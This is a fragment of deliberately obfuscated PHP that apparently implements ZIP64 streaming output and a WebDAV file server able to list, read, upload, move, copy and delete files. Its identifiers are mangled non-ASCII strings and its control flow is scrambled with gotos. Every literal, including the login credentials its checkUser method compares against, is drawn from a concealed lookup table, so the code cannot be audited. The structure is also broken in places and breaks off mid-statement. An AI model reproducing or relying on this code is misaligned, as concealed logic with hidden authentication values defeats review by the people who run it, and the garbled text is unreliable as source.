b§º½šª„; b§º½šª„: $bùÆøºîô = $this->dosTime(time()); $Eß¤†íÇª = array(array($DÇ¨’×Øõ›[1981], static::FILE_HEADER_SIGNATURE), array($DÇ¨’×Øõ›[1982], static::ZIP_VERSION_64), array($DÇ¨’×Øõ›[1982], 8), array($DÇ¨’×Øõ›[1982], $b¼ñ—–êîÎ), array($DÇ¨’×Øõ›[1981], $bùÆøºîô), array($DÇ¨’×Øõ›[1981], 0), array($DÇ¨’×Øõ›[1981], 4294967295), array($DÇ¨’×Øõ›[1981], 4294967295), array($DÇ¨’×Øõ›[1982], $bÙœ¡³ƒ†ˆ), array($DÇ¨’×Øõ›[1982], 32)); $fÏ¯Á‡†Ù = array(array($DÇ¨’×Øõ›[1982], 1), array($DÇ¨’×Øõ›[1982], 28), array($DÇ¨’×Øõ›[1983], 0), array($DÇ¨’×Øõ›[1983], 0), array($DÇ¨’×Øõ›[1983], 0), array($DÇ¨’×Øõ›[1981], 0)); goto aàšÈÀ’; aàšÈÀ’: $bİ‚»´‰ = $this->packFields($Eß¤†íÇª); $d×Ç‘óù·ï = $this->packFields($fÏ¯Á‡†Ù); $this->send($bİ‚»´‰ . $a«ì“õ¿È . $d×Ç‘óù·ï); goto eÂœÚÉ§âß; eÂœÚÉ§âß: return strlen($bİ‚»´‰) + $bÙœ¡³ƒ†ˆ + strlen($d×Ç‘óù·ï); goto C®ŒÃÌçÉÁ; C®ŒÃÌçÉÁ: } protected function addFileFooter($Dƒ‡¬÷ç’¬, $C¸ˆŒç×˜ó, $e‡ñğ†²‹, $c÷ÜÇİ®’, $EßØø‘Á¯, $b¡‘æìÅéº) { $aŠËİºî²Å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E‡’ÔÍµîÀ = array(array($aŠËİºî²Å[1981], static::DATA_DESCRIPTOR_SIGNATURE), array($aŠËİºî²Å[1981], $e‡ñğ†²‹), array($aŠËİºî²Å[1983], $c÷ÜÇİ®’), array($aŠËİºî²Å[1983], $EßØø‘Á¯)); $f…‡†×Ö = $this->packFields($E‡’ÔÍµîÀ); $this->send($f…‡†×Ö); $EïëÕ±ï˜ = $b¡‘æìÅéº + $c÷ÜÇİ®’ + $D—µ”‰Üª‚; $this->addToCdr($Dƒ‡¬÷ç’¬, $C¸ˆŒç×˜ó, $e‡ñğ†²‹, $c÷ÜÇİ®’, $EßØø‘Á¯, $EïëÕ±ï˜); } private function addToCdr($B²ùÒÙÖ¶Ø, $eØö†êˆØ«, $F˜ğ‡˜º˜–, $B‡„½ÛÂ, $e‡¥ô‚¸ˆ, $aŒÙŒ„é„„) { $this->files[] = array($B²ùÒÙÖ¶Ø, $eØö†êˆØ«, $F˜ğ‡˜º˜–, $B‡„½ÛÂ, $e‡¥ô‚¸ˆ, $this->ofs); $this->ofs += $aŒÙŒ„é„„; } protected function addCdrFile($bÅİªš„øƒ) { goto bôãŸ„³¶š; b‰‘ŠÖàá¥: $cÍˆ·œó° = $this->dosTime(time()); $eõ¢‚Ê¿¸† = array(array($B®ÀŠŞÉº[1981], static::CDR_FILE_SIGNATURE), array($B®ÀŠŞÉº[1982], static::ZIP_VERSION_64), array($B®ÀŠŞÉº[1982], static::ZIP_VERSION_64), array($B®ÀŠŞÉº[1982], 8), array($B®ÀŠŞÉº[1982], $eîÁæÈ„°), array($B®ÀŠŞÉº[1981], $cÍˆ·œó°), array($B®ÀŠŞÉº[1981], $bÊõÍ‘öŞ), array($B®ÀŠŞÉº[1981], 4294967295), array($B®ÀŠŞÉº[1981], 4294967295), array($B®ÀŠŞÉº[1982], strlen($FëŠ©Ø¤•ñ)), array($B®ÀŠŞÉº[1982], 32), array($B®ÀŠŞÉº[1982], strlen($c‡‘ÃìëØë)), array($B®ÀŠŞÉº[1982], 0), array($B®ÀŠŞÉº[1982], 0), array($B®ÀŠŞÉº[1981], 32), array($B®ÀŠŞÉº[1981], 4294967295)); $aòã£ßğ÷£ = array(array($B®ÀŠŞÉº[1982], 1), array($B®ÀŠŞÉº[1982], 28), array($B®ÀŠŞÉº[1983], $e„†ë½â¯ñ), array($B®ÀŠŞÉº[1983], $F²Ìİ¶ÅóŒ), array($B®ÀŠŞÉº[1983], $dŞË½Ù‚ø), array($B®ÀŠŞÉº[1981], 0)); goto B¦éÔ²±³”; bôãŸ„³¶š: $B®ÀŠŞÉº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; list($FëŠ©Ø¤•ñ, $eîÁæÈ„°, $bÊõÍ‘öŞ, $F²Ìİ¶ÅóŒ, $e„†ë½â¯ñ, $dŞË½Ù‚ø) = $bÅİªš„øƒ; $c‡‘ÃìëØë = $B®ÀŠŞÉº[33]; goto b‰‘ŠÖàá¥; B¦éÔ²±³”: $eé©·ÚÕÎ£ = $this->packFields($eõ¢‚Ê¿¸†); $fÂ•ŒŠè„¾ = $this->packFields($aòã£ßğ÷£); $fà«äàóÂÓ = $eé©·ÚÕÎ£ . $FëŠ©Ø¤•ñ . $c‡‘ÃìëØë . $fÂ•ŒŠè„¾; goto cÜ„×¡¿ŞÂ; cÜ„×¡¿ŞÂ: $this->send($fà«äàóÂÓ); $this->cdr_ofs += strlen($fà«äàóÂÓ); goto eôÜæÅ­è; eôÜæÅ­è: } protected function addCdr64Eof() { goto C¼¨•İä¨¦; e„»ìñãö«: $this->send($a…£Œè¶šÑ); goto fŞÅ›·øò¦; C¼¨•İä¨¦: $D‚ì¥Ñ±®ª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cï«çÖ’ = count($this->files); $bÎÚ‡Õ‘§ö = $this->cdr_ofs; goto báƒšöÙ‹…; báƒšöÙ‹…: $fåÇó¥òÀä = $this->ofs; $D°¸‰§àÏã = array(array($D‚ì¥Ñ±®ª[1981], static::ZIP64_CDR_EOF_SIGNATURE), array($D‚ì¥Ñ±®ª[1983], 44), array($D‚ì¥Ñ±®ª[1982], static::ZIP_VERSION_64), array($D‚ì¥Ñ±®ª[1982], static::ZIP_VERSION_64), array($D‚ì¥Ñ±®ª[1981], 0), array($D‚ì¥Ñ±®ª[1981], 0), array($D‚ì¥Ñ±®ª[1983], $Cï«çÖ’), array($D‚ì¥Ñ±®ª[1983], $Cï«çÖ’), array($D‚ì¥Ñ±®ª[1983], $bÎÚ‡Õ‘§ö), array($D‚ì¥Ñ±®ª[1983], $fåÇó¥òÀä)); $a…£Œè¶šÑ = $this->packFields($D°¸‰§àÏã); goto e„»ìñãö«; fŞÅ›·øò¦: } protected function addCdr64Locator() { goto E­’À“¤Ù; C¬ñĞ…¤ù‹: $dØç é¼×‘ = $this->ofs; $A¯‚ôÛïÄ = array(array($aÜ†‡«œ[1981], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($aÜ†‡«œ[1981], 0), array($aÜ†‡«œ[1983], $dØç é¼×‘ + $f‰ÒòÔ«), array($aÜ†‡«œ[1981], 1)); $EÉáÃ×¿ÃŸ = $this->packFields($A¯‚ôÛïÄ); goto d¸áêàÚÙÓ; d¸áêàÚÙÓ: $this->send($EÉáÃ×¿ÃŸ); goto eÕ¶µğ™; E­’À“¤Ù: $aÜ†‡«œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EéÍ˜¸Ê¥¸ = count($this->files); $f‰ÒòÔ« = $this->cdr_ofs; goto C¬ñĞ…¤ù‹; eÕ¶µğ™: } protected function addCdrEof() { goto D‰¾ğí¹›Ş; D‰¾ğí¹›Ş: $EÂÖ‹ºŠ×Í =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B°İéø„ªˆ = count($this->files); $B¾ø’‘†î = $this->cdr_ofs; goto eË‰ÔÜÇ¨¬; eË‰ÔÜÇ¨¬: $A©¥Óó¦Êî = $this->ofs; $aÌ‡©‹—¬Ø = $EÂÖ‹ºŠ×Í[33]; $eƒÙéÇ´©¥ = array(array($EÂÖ‹ºŠ×Í[1981], static::CDR_EOF_SIGNATURE), array($EÂÖ‹ºŠ×Í[1982], 0), array($EÂÖ‹ºŠ×Í[1982], 0), array($EÂÖ‹ºŠ×Í[1982], $B°İéø„ªˆ), array($EÂÖ‹ºŠ×Í[1982], $B°İéø„ªˆ), array($EÂÖ‹ºŠ×Í[1981], 4294967295), array($EÂÖ‹ºŠ×Í[1981], 4294967295), array($EÂÖ‹ºŠ×Í[1982], strlen($aÌ‡©‹—¬Ø))); goto D¼˜õ„¼º•; D¼˜õ„¼º•: $Dµ½ø—ù„Ë = $this->packFields($eƒÙéÇ´©¥) . $aÌ‡©‹—¬Ø; $this->send($Dµ½ø—ù„Ë); goto b­Ì³¢ğ…¦; b­Ì³¢ğ…¦: } protected function addCdr() { foreach ($this->files as $FŠËÒ¾İ¹·) { $this->addCdrFile($FŠËÒ¾İ¹·); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Eš¦Ñ¥É¥³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fâá‚“½‡ = $Eš¦Ñ¥É¥³[199]; if ($this->outputName) { $EÌœâÕ†Í = trim(str_replace(array($Eš¦Ñ¥É¥³[113], $Eš¦Ñ¥É¥³[55], $Eš¦Ñ¥É¥³[95], $Eš¦Ñ¥É¥³[67], $Eš¦Ñ¥É¥³[214], $Eš¦Ñ¥É¥³[984]), $Eš¦Ñ¥É¥³[33], $this->outputName)); $A¢ÆÜåŠ²í = rawurlencode($EÌœâÕ†Í); $Fâá‚“½‡ .= "\x3b\x20\x66\151\154\x65\x6e\x61\155\x65\52\75\x75\x74\146\55\70\47\47{$A¢ÆÜåŠ²í}"; } $B‡éÄ‰âôé = array($Eš¦Ñ¥É¥³[196] => $Eš¦Ñ¥É¥³[1984], $Eš¦Ñ¥É¥³[1985] => $Fâá‚“½‡, $Eš¦Ñ¥É¥³[1986] => $Eš¦Ñ¥É¥³[1987], $Eš¦Ñ¥É¥³[1988] => $Eš¦Ñ¥É¥³[1989], $Eš¦Ñ¥É¥³[1990] => $Eš¦Ñ¥É¥³[1991]); foreach ($B‡éÄ‰âôé as $fƒĞ¸µ‹Ó¾ => $C¸ÏŒ“·ù„) { header($fƒĞ¸µ‹Ó¾ . $Eš¦Ñ¥É¥³[874] . $C¸ÏŒ“·ù„); } } protected function send($CãÈ²¸Íè±) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CãÈ²¸Íè±); } protected final function dosTime($c‡Úï¹Û•) { $dµ¢¢êğÇ¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÉè©‚†èë = getdate($c‡Úï¹Û•); if ($dÉè©‚†èë[$dµ¢¢êğÇ¯[1694]] < 1980) { $dÉè©‚†èë = array($dµ¢¢êğÇ¯[1694] => 1980, $dµ¢¢êğÇ¯[1992] => 1, $dµ¢¢êğÇ¯[1993] => 1, $dµ¢¢êğÇ¯[1994] => 0, $dµ¢¢êğÇ¯[1995] => 0, $dµ¢¢êğÇ¯[1996] => 0); } $dÉè©‚†èë[$dµ¢¢êğÇ¯[1694]] -= 1980; return $dÉè©‚†èë[$dµ¢¢êğÇ¯[1694]] << 25 | $dÉè©‚†èë[$dµ¢¢êğÇ¯[1992]] << 21 | $dÉè©‚†èë[$dµ¢¢êğÇ¯[1993]] << 16 | $dÉè©‚†èë[$dµ¢¢êğÇ¯[1994]] << 11 | $dÉè©‚†èë[$dµ¢¢êğÇ¯[1995]] << 5 | $dÉè©‚†èë[$dµ¢¢êğÇ¯[1996]] >> 1; } protected function packFields($e»ÍƒÔÂÆ«) { $cÃ¨¨èÂ˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b‚°¿ÊÔÏ = $cÃ¨¨èÂ˜[33]; $EÏ°òèö»Ì = array(); foreach ($e»ÍƒÔÂÆ« as $f†©­ÕçØ¼) { $b‚°¿ÊÔÏ .= $f†©­ÕçØ¼[0]; $EÏ°òèö»Ì[] = $f†©­ÕçØ¼[1]; } array_unshift($EÏ°òèö»Ì, $b‚°¿ÊÔÏ); return call_user_func_array($cÃ¨¨èÂ˜[1997], $EÏ°òèö»Ì); } protected function filterFilename($fØŸ‹ä³Òä) { $f±ˆ«ãİºÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return str_replace(array($f±ˆ«ãİºÏ[95], $f±ˆ«ãİºÏ[4], $f±ˆ«ãİºÏ[173], $f±ˆ«ãİºÏ[69], $f±ˆ«ãİºÏ[113], $f±ˆ«ãİºÏ[919], $f±ˆ«ãİºÏ[922], $f±ˆ«ãİºÏ[268]), $f±ˆ«ãİºÏ[70], $fØŸ‹ä³Òä); } } class ZipStream { } goto F¡†õ·îÇ; e¼„©öÁ: class HttpDavServer { public function __construct($EŞøÜÂÁçä, $cŠ­Œ†¡›æ) { $this->root = $EŞøÜÂÁçä; $this->initPath($cŠ­Œ†¡›æ); $this->start(); } public function initPath($AÄÃ²¸—) { $f¿Í„œ¯ø÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dˆù†„‰¼š = rtrim($_SERVER[$f¿Í„œ¯ø÷[1360]], $f¿Í„œ¯ø÷[8]) . $f¿Í„œ¯ø÷[8]; $this->urlBase = substr($Dˆù†„‰¼š, 0, strpos($Dˆù†„‰¼š, $AÄÃ²¸—) + 1); $this->urlBase = rtrim($this->urlBase, $f¿Í„œ¯ø÷[8]) . $AÄÃ²¸—; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $f‹Ã¯‰„Íª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÕ¸ÔÁ¢„´ = HttpAuth::get(); if ($CÕ¸ÔÁ¢„´[$f‹Ã¯‰„Íª[531]] == $f‹Ã¯‰„Íª[1752] && $CÕ¸ÔÁ¢„´[$f‹Ã¯‰„Íª[891]] == $f‹Ã¯‰„Íª[1753]) { return !0; } HttpAuth::error(); } public function start() { goto Dƒƒ˜ğ•Ã; Dƒƒ˜ğ•Ã: $c›ßƒÏœ£Ô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->checkUser(); $bì‚ºãÇ = $c›ßƒÏœ£Ô[143] . HttpHeader::method(); goto dÄ‹Ş¢™»á; DÌ ‹“ —: if (!$EË®ëÛ¨ñ) { return; } self::response($EË®ëÛ¨ñ); goto f™ëßËà‹Ï; dÄ‹Ş¢™»á: if (!method_exists($this, $bì‚ºãÇ)) { pr($bì‚ºãÇ . $c›ßƒÏœ£Ô[1754]); die; } $d³®ÉÔô = array($c›ßƒÏœ£Ô[1755], $c›ßƒÏœ£Ô[1756]); if (!in_array($bì‚ºãÇ, $d³®ÉÔô) && !$this->pathExists($this->path)) { $EË®ëÛ¨ñ = array($c›ßƒÏœ£Ô[1024] => 404); } else { $EË®ëÛ¨ñ = $this->{$bì‚ºãÇ}(); } goto DÌ ‹“ —; f™ëßËà‹Ï: } public function pathGet($e‡ìÛ§± = false) { $dÕÄ©Î½äŞ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bí¬Ö¸¿’ = $e‡ìÛ§± ? $_SERVER[$dÕÄ©Î½äŞ[1757]] : $_SERVER[$dÕÄ©Î½äŞ[1360]]; $Bí¬Ö¸¿’ = KodIO::clear(rawurldecode($Bí¬Ö¸¿’)); if (!strstr($Bí¬Ö¸¿’, KodIO::clear($this->urlBase))) { return !1; } return substr($Bí¬Ö¸¿’, strpos($Bí¬Ö¸¿’, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($B÷é‘òğ—) { return file_exists($B÷é‘òğ—); } public function pathMkdir($e±¡²¥‰©§) { return mkdir($e±¡²¥‰©§, 511, !0); } public function pathInfo($Dø¬ãßÂ§ô) { return path_info($Dø¬ãßÂ§ô); } public function pathList($c„èáçèÕ) { return path_list($c„èáçèÕ); } public function pathOut($Dï”ÑØôåˆ) { echo file_get_contents($Dï”ÑØôåˆ); } public function pathPut($A¾çÆ¨ƒ•·, $aÇ‰÷†š”Ú = '') { if (!$aÇ‰÷†š”Ú) { return file_put_contents($A¾çÆ¨ƒ•·, $_SERVER[ÚŠ•´ÍéÒÑÔ][33]); } return move_path($aÇ‰÷†š”Ú, $A¾çÆ¨ƒ•·); } public function pathRemove($D½¥²Öó’) { if (is_file($D½¥²Öó’)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($C»àœÄÁ, $eŒ‰ªí¶) { return move_path($C»àœÄÁ, $eŒ‰ªí¶); } public function pathCopy($B¿è„„ò, $d¢Ò²·ò½ã) { return copy_dir($B¿è„„ò, $d¢Ò²·ò½ã); } public function parsePath($dÕï¹Ğ„÷Ö) { return $dÕï¹Ğ„÷Ö; } public function parseItem($aöŒºÊ‹Ê¤, $dœá×«¿š) { goto dù¨Ÿœ˜ô; dù¨Ÿœ˜ô: $CÃ¡Ñ‡å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f¶ó¼¹’˜Ö = $this->pathGet() . $CÃ¡Ñ‡å[8] . $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[28]]; $f¶ó¼¹’˜Ö = $CÃ¡Ñ‡å[8] . str_replace($CÃ¡Ñ‡å[169], $CÃ¡Ñ‡å[8], rawurlencode($f¶ó¼¹’˜Ö)); goto DÕêØ’ŒÇ‚; DÕêØ’ŒÇ‚: if ($dœá×«¿š) { $f¶ó¼¹’˜Ö = $CÃ¡Ñ‡å[8] . str_replace($CÃ¡Ñ‡å[169], $CÃ¡Ñ‡å[8], rawurlencode($this->pathGet())); } if (!trim($aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[107]])) { $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[107]] = time(); } if (!trim($aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[184]])) { $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[184]] = time(); } goto CñÄµ–ÌØç; CñÄµ–ÌØç: $FğÇÕÈ‰º = array($CÃ¡Ñ‡å[1758] => KodIO::clear($this->urlBase . $f¶ó¼¹’˜Ö), $CÃ¡Ñ‡å[107] => @gmdate($CÃ¡Ñ‡å[1759], $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[107]]), $CÃ¡Ñ‡å[184] => @gmdate($CÃ¡Ñ‡å[1760], $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[184]]), $CÃ¡Ñ‡å[77] => $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[77]] ? $aöŒºÊ‹Ê¤[$CÃ¡Ñ‡å[77]] : 0); return $FğÇÕÈ‰º; goto d®„»½öĞÙ; d®„»½öĞÙ: } public function parseItemXml($Cø¸“‡ŒÃ‡, $F·ê¸°‘Ñ) { $A´÷²½æÓñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f½Ò’¿·²ô = $this->parseItem($Cø¸“‡ŒÃ‡, $F·ê¸°‘Ñ); if ($Cø¸“‡ŒÃ‡[$A´÷²½æÓñ[29]] == $A´÷²½æÓñ[76]) { $AÛÃëÓõÉø = $A´÷²½æÓñ[1761]; $AÛÃëÓõÉø .= $A´÷²½æÓñ[1762]; } else { $D­½ö­† = $Cø¸“‡ŒÃ‡[$A´÷²½æÓñ[157]] ? $Cø¸“‡ŒÃ‡[$A´÷²½æÓñ[157]] : get_path_ext($Cø¸“‡ŒÃ‡[$A´÷²½æÓñ[28]]); $C‰É»ÉÄÁ = get_file_mime($D­½ö­†); $AÛÃëÓõÉø = $A´÷²½æÓñ[1763]; $AÛÃëÓõÉø .= "\x3c\x44\72\x67\145\164\x63\x6f\156\x74\x65\x6e\x74\x74\x79\160\x65\x3e{$C‰É»ÉÄÁ}\74\57\104\72\147\145\164\143\157\156\x74\145\156\x74\164\x79\160\x65\76"; } return "\xa\x9\11\x3c\104\72\162\145\x73\160\157\x6e\163\145\x3e\xa\11\11\11\x3c\104\x3a\x68\162\x65\x66\76{$f½Ò’¿·²ô[$A´÷²½æÓñ[1758]]}\x3c\57\x44\x3a\150\x72\145\x66\x3e\12\x9\x9\11\74\x44\72\x70\162\x6f\160\x73\x74\141\164\x3e\12\x9\x9\x9\11\74\104\72\x70\x72\x6f\x70\x3e\xa\x9\x9\11\x9\x9\74\104\72\147\145\x74\x6c\141\x73\164\x6d\x6f\x64\151\x66\x69\x65\144\76{$f½Ò’¿·²ô[$A´÷²½æÓñ[107]]}\x3c\x2f\104\x3a\x67\x65\164\x6c\141\x73\x74\x6d\x6f\x64\151\146\x69\145\144\76\xa\11\11\11\x9\x9\74\104\x3a\x63\x72\x65\141\x74\x69\x6f\x6e\x64\141\x74\145\x3e{$f½Ò’¿·²ô[$A´÷²½æÓñ[184]]}\74\x2f\x44\72\x63\162\x65\x61\164\151\x6f\x6e\x64\x61\164\x65\76\12\11\x9\x9\11\11\74\x44\x3a\x67\x65\164\143\157\156\x74\145\x6e\x74\x6c\x65\x6e\x67\164\150\76{$f½Ò’¿·²ô[$A´÷²½æÓñ[77]]}\74\x2f\104\x3a\x67\145\164\143\x6f\156\x74\145\x6e\x74\x6c\x65\x6e\x67\x74\x68\x3e\xa\11\x9\11\x9\11{$AÛÃëÓõÉø}\xa\11\11\x9\x9\74\57\x44\x3a\160\162\157\160\x3e\xa\11\11\x9\11\74\104\72\163\x74\x61\164\165\x73\x3e\x48\124\x54\x50\x2f\x31\56\61\x20\x32\60\x30\x20\117\113\74\57\x44\72\x73\x74\141\x74\165\x73\x3e\xa\x9\x9\11\74\x2f\x44\x3a\x70\x72\157\x70\163\164\x61\164\x3e\12\11\11\74\57\104\x3a\162\x65\163\160\157\156\x73\145\76"; } public function pathListMerge($FÉîö°†’ˆ) { goto a¤Ç¥ˆ¹†; Cñ”¬ÆÉ˜ˆ: return $EÚ¬Ì±ªÊ˜; goto Fº¯ÍÄÂ¦; a¤Ç¥ˆ¹†: $f‡ˆ½„¾¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$FÉîö°†’ˆ) { return $FÉîö°†’ˆ; } $A’ö™òŒ·† = array($f‡ˆ½„¾¼[73], $f‡ˆ½„¾¼[74], $f‡ˆ½„¾¼[1764]); goto f¯ª †Í‚; f¯ª †Í‚: $EÚ¬Ì±ªÊ˜ = array(); foreach ($FÉîö°†’ˆ as $cÁ²µìë¨· => $EÏ¯¦³ì‹¥) { if (!in_array($cÁ²µìë¨·, $A’ö™òŒ·†) || !is_array($EÏ¯¦³ì‹¥)) { continue; } $EÚ¬Ì±ªÊ˜ = array_merge($EÚ¬Ì±ªÊ˜, $EÏ¯¦³ì‹¥); } foreach ($EÚ¬Ì±ªÊ˜ as &$fòá´‹ø±‰) { $fòá´‹ø±‰[$f‡ˆ½„¾¼[28]] = str_replace($f‡ˆ½„¾¼[8], $f‡ˆ½„¾¼[1362], $fòá´‹ø±‰[$f‡ˆ½„¾¼[28]]); } goto Cñ”¬ÆÉ˜ˆ; Fº¯ÍÄÂ¦: } public function httpPROPFIND() { goto F‡¡’¬Ÿ˜; F«£µãÈŞÊ: $DõÀ±î¿± = $d¶­É½‰™ô[$bˆ¸»æ‹î[1765]]; if (!is_array($fó„…«ŠÀß) || $DõÀ±î¿±[$bˆ¸»æ‹î[1766]] === !1) { return array($bˆ¸»æ‹î[1767] => 404, $bˆ¸»æ‹î[1768] => $bˆ¸»æ‹î[1769]); } $a¸¨á¸Ä°Ê = $DõÀ±î¿±[$bˆ¸»æ‹î[29]] == $bˆ¸»æ‹î[164] || HttpHeader::get($bˆ¸»æ‹î[1744]) == $bˆ¸»æ‹î[464]; goto b°ãÒï×„°; b°ãÒï×„°: if ($a¸¨á¸Ä°Ê) { $fó„…«ŠÀß = array($DõÀ±î¿±); } else { $DõÀ±î¿±[$bˆ¸»æ‹î[28]] = $bˆ¸»æ‹î[33]; $fó„…«ŠÀß = array_merge(array($DõÀ±î¿±), $fó„…«ŠÀß); } $Fö¯ç¸Ş¾Î = $bˆ¸»æ‹î[33]; foreach ($fó„…«ŠÀß as $B ¾Ê¯ªØ) { $Fö¯ç¸Ş¾Î .= $this->parseItemXml($B ¾Ê¯ªØ, $a¸¨á¸Ä°Ê); } goto C¾‡â¬±¦µ; F‡¡’¬Ÿ˜: $bˆ¸»æ‹î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d¶­É½‰™ô = $this->pathList($this->path); $fó„…«ŠÀß = $this->pathListMerge($d¶­É½‰™ô); goto F«£µãÈŞÊ; C¾‡â¬±¦µ: return array($bˆ¸»æ‹î[1767] => 207, $bˆ¸»æ‹î[1768] => "\74\104\72\155\165\154\164\151\x73\x74\x61\164\165\x73\40\170\x6d\x6c\156\163\x3a\104\75\42\x44\101\x56\72\42\x3e\12{$Fö¯ç¸Ş¾Î}\xa\x3c\57\104\72\x6d\x75\x6c\x74\151\163\164\141\x74\165\x73\76"); goto E­«…õàŞ; E­«…õàŞ: } public function httpHEAD() { $C„ã§é÷Üã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CùÜ›Õ‘ñ = $this->pathInfo($this->path); if (!$CùÜ›Õ‘ñ || $CùÜ›Õ‘ñ[$C„ã§é÷Üã[29]] == $C„ã§é÷Üã[76]) { return array($C„ã§é÷Üã[1024] => 200, $C„ã§é÷Üã[1194] => array($C„ã§é÷Üã[1770])); } return array($C„ã§é÷Üã[1024] => 200, $C„ã§é÷Üã[1194] => array($C„ã§é÷Üã[1771], $C„ã§é÷Üã[136], $C„ã§é÷Üã[1772] . $CùÜ›Õ‘ñ[$C„ã§é÷Üã[77]], $C„ã§é÷Üã[1773] . get_file_mime($CùÜ›Õ‘ñ[$C„ã§é÷Üã[157]]), $C„ã§é÷Üã[132] . gmdate($C„ã§é÷Üã[1759], $CùÜ›Õ‘ñ[$C„ã§é÷Üã[1241]]) . $C„ã§é÷Üã[1774], $C„ã§é÷Üã[1775])); } public function httpOPTIONS() { $aÈ±¦Á‘Ê¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($aÈ±¦Á‘Ê¾[1024] => 200, $aÈ±¦Á‘Ê¾[1194] => array($aÈ±¦Á‘Ê¾[1776], $aÈ±¦Á‘Ê¾[1777], $aÈ±¦Á‘Ê¾[1778], $aÈ±¦Á‘Ê¾[1250])); } public function httpPROPPATCH() { $f† ¥ÃÖ±Ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¯×³º ¨Ò = $f† ¥ÃÖ±Ê[1779] . $_SERVER[$f† ¥ÃÖ±Ê[1360]] . $f† ¥ÃÖ±Ê[1780]; return array($f† ¥ÃÖ±Ê[1767] => 207, $f† ¥ÃÖ±Ê[1768] => "\74\104\x3a\155\165\x6c\x74\151\163\x74\x61\164\165\x73\40\x78\x6d\x6c\156\x73\x3a\104\75\42\x44\x41\x56\x3a\42\x3e\xa{$E¯×³º ¨Ò}\xa\74\57\104\72\x6d\165\x6c\164\x69\x73\164\x61\x74\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $D«òİÂ¶¶õ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a¼óçÊìÖ = $this->uploadFile(); if ($a¼óçÊìÖ) { $EÉ†Ó‘Ÿ®Ù = 204; } else { $a¼óçÊìÖ = $D«òİÂ¶¶õ[33]; $EÉ†Ó‘Ÿ®Ù = 201; } $Dç«¤¢Úî = $this->pathPut($this->path, $a¼óçÊìÖ); if ($Dç«¤¢Úî == !1) { $EÉ†Ó‘Ÿ®Ù = 404; } return array($D«òİÂ¶¶õ[1767] => $EÉ†Ó‘Ÿ®Ù); } private function uploadFile() { goto Eóâèì“†; Dô²ˆÑ´å‡: while (!feof($c®Š”Œ›äò)) { fwrite($b±—Õ¶õšô, fread($c®Š”Œ›äò, 1024 * 200)); } fclose($c®Š”Œ›äò); fclose($b±—Õ¶õšô); goto f¬ˆùã¹Œ‚; A“Ôš†¶™ó: $b±—Õ¶õšô = @fopen($AÚĞÖ‘Ï¥Ñ, $c«¸†ø¤Šî[1489]); $c®Š”Œ›äò = @fopen($c«¸†ø¤Šî[1782], $c«¸†ø¤Šî[1488]); if (!$c®Š”Œ›äò || !$b±—Õ¶õšô) { @unlink($AÚĞÖ‘Ï¥Ñ); return !1; } goto Dô²ˆÑ´å‡; f¬ˆùã¹Œ‚: if (@filesize($AÚĞÖ‘Ï¥Ñ) > 0) { return $AÚĞÖ‘Ï¥Ñ; } @unlink($AÚĞÖ‘Ï¥Ñ); return !1; goto EøªÀÅ®®; Eóâèì“†: $c«¸†ø¤Šî =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; @mk_dir(TEMP_FILES); $AÚĞÖ‘Ï¥Ñ = TEMP_FILES . $c«¸†ø¤Šî[1781] . rand_string(32); goto A“Ôš†¶™ó; EøªÀÅ®®: } public function httpMKCOL() { $C·ï•ğ»´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->pathExists($this->path)) { return array($C·ï•ğ»´[1024] => 409); } $cÎìùšÖ™ = $this->pathMkdir($this->path); return array($C·ï•ğ»´[1024] => $cÎìùšÖ™ ? 201 : 403); } public function httpMOVE() { $f÷›ñ˜¿’È =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EœİÁœ««Ö = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$f÷›ñ˜¿’È[1783]])) { $b–´™ÒÍÃ™[$f÷›ñ˜¿’È[1784]] = $_SERVER[$f÷›ñ˜¿’È[1783]] == $f÷›ñ˜¿’È[1785]; } $aÕóó…ìµæ = $this->pathMove($this->path, $EœİÁœ««Ö); return array($f÷›ñ˜¿’È[1024] => $aÕóó…ìµæ ? 201 : 404); } public function httpCOPY() { $C…ÙğïÇŒ· = $this->parsePath($this->pathGet(!0)); $CåñÚ©è… = $this->pathCopy($this->path, $C…ÙğïÇŒ·); return array($_SERVER[ÚŠ•´ÍéÒÑÔ][1024] => $CåñÚ©è… ? 